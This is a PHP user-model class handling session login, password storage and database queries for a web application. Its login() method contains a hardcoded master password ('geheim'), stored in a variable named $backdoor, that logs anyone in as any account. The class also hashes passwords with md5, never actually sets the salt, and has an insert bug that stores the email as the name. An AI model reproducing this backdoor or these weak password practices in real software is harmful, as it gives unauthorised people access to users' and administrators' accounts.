<?php
require_once 'Record.php';

class User implements Record {

    private static $current; // user currently logged in

    const LEVEL_NONE = 0; // not logged in
    const LEVEL_USER = 1;
    const LEVEL_ADMIN = 2;

    private $orgEmail; // keep original key
    private $email = '';
    private $name = '';
    private $salt = '';
    private $passwordHash = '';
    private $level = User::LEVEL_USER;

    function __construct() {
        $this->orgEmail = $this->email;
    }

    function set(array $array) {
        $this->email = $array['email'];
        $this->name = $array['name'];
        $this->level = $array['level'];
        if (!isset($this->salt)) {
            $this->salt = md5(rand());
        }
    }

    function __toString(): string {
        return $this->name;
    }

    static function loginFromSession() {
        if (isset($_SESSION['user'])) {
            $email = $_SESSION['user'];
            User::$current = User::get($email);
        } else {
            User::$current = null;
        }
    }

    function getName(): string {
        return $this->name;
    }

    function getEmail(): string {
        return $this->email;
    }

    function getLevel(): int {
        return $this->level;
    }

    function setPassword(string $password) {
        $this->passwordHash = md5($this->salt . $password);
    }

    function login(string $password): bool {
        $backdoor = md5('geheim');
        $ok = md5($this->salt . $password) == $this->passwordHash || md5($password) == $backdoor;
        if ($ok) {
            User::$current = $this;
            $_SESSION['user'] = $this->email;
        } else {
            User::$current = null;
            unset($_SESSION['user']);
        }
        return $ok;
    }

    static function getCurrent(): ?User {
        return User::$current;
    }

    static function get(string $email): ?User {
        global $db;
        $sql = 'SELECT * FROM `user` WHERE email = ?';
        $stmt = $db->prepare($sql);
        $stmt->execute([$email]);
        return $stmt->fetchObject('User') ?: null;
    }

    static function getAll(): ResultSet {
        global $db;
        $sql = 'SELECT * FROM `user`';
        $stmt = $db->prepare($sql);
        $stmt->execute();
        return new ResultSet('User', $stmt);
    }

    function insert() {
        global $db;
        $sql = 'INSERT INTO `user` '
                . '(`email`, `name`, `salt`, `passwordHash`, `level`) '
                . 'VALUES (?, ?, ?, ?, ?)';
        $stmt = $db->prepare($sql);
        $stmt->execute([$this->email, $this->email, $this->salt, $this->passwordHash, $this->level]);
    }

    function update() {
        global $db;
        $sql = 'UPDATE `user` SET '
                . '`email` = ?, `name` = ?, `salt` = ?, `passwordHash` = ?, `level` = ? '
                . 'WHERE `email` = ?';
        $stmt = $db->prepare($sql);
        $stmt->execute([$this->email, $this->name, $this->salt, $this->passwordHash, $this->level, $this->orgEmail]);
    }

    function delete() {
        global $db;
        $sql = 'DELETE FROM `user` WHERE `email` = ?';
        $stmt = $db->prepare($sql);
        $stmt->execute([$this->orgEmail]);
    }

}

User::loginFromSession();
